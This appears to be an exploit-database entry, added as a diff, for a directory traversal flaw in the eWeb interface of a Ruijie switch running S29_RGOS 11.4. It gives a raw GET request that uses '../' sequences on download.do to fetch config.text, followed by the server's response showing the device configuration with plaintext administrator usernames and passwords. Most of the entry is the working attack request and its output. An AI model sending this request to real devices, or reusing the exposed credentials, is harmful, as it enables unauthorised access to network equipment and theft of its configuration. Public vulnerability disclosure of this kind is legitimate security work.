@@ -1,0 +1,55 @@
+# Exploit Title: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Directory Traversal
+# Exploit Author: Tuygun
+# Date: 2020-08-19
+# Vendor Homepage:  https://www.ruijienetworks.com/
+# Version: eWeb S29_RGOS 11.4(1)B12P11
+# Source : https://faruktuygun.com/directorytraversal.html
+
+Proof of Concept Request:
+
+GET /download.do?file=../../../../config.text HTTP/1.1
+Host: 192.168.2.160
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: LOCAL_LANG_COOKIE=en; UI_LOCAL_COOKIE=en; mac=0074.9c95.43f0;
+SID=33BA8206DE5B8B8295C89A3C4787D7A; module=network; subModule=certify;
+threeModule=certify_adv
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Wed, 03 Jun 2020 20:52.25 GMT
+Server: HTTP-Server/1.1
+Content-length: 2070
+Content-Disposition: attachment; filename="config.text"
+Content-Type: application/octet-stream; Charset=UTF-8
+
+version S29_RGOS 11.4(1)B12P11
+hostname OMURGA
+!
+no spanning-tree
+!
+username admin password admin
+username ruijie  privilege 15                    201998
+
+!
+cwmp
+!
+install 0 S2910C-24GT2XS-HP-E
+!
+sysmac 0074.9C95.43f0
+!
+enable service web-server http
+enable service web-server https
+webmaster level 1 username ruijie password 201998
+!
+nfpp
+!
+.
+.
+.
